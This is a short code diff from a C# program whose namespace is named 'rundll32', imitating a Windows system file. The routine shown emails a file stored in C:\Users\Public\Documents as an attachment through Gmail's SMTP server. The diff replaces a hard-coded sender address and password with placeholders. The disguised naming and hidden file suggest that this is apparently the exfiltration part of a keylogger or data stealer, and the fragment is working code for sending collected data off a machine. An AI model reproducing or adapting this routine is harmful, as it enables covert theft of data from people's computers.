@@ -94,15 +94,15 @@ namespace rundll32
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-            mail.From = new MailAddress("fakeemail29292@gmail.com");
-            mail.To.Add("fakeemail29292@gmail.com");
+            mail.From = new MailAddress("//add email here");
+            mail.To.Add("//add email here");
             mail.Subject = "Test Mail - 1";
             mail.Body = "mail with attachment";
             Attachment attachment;
             attachment = new Attachment(@"C:\Users\Public\Documents\dll32.txt");
             mail.Attachments.Add(attachment);
             SmtpServer.Port = 587;
-            SmtpServer.Credentials = new NetworkCredential("fakeemail29292@gmail.com", "thisismypassword");
+            SmtpServer.Credentials = new NetworkCredential("//add email here", "//add password here");
             SmtpServer.EnableSsl = true;
             SmtpServer.Send(mail);
         }
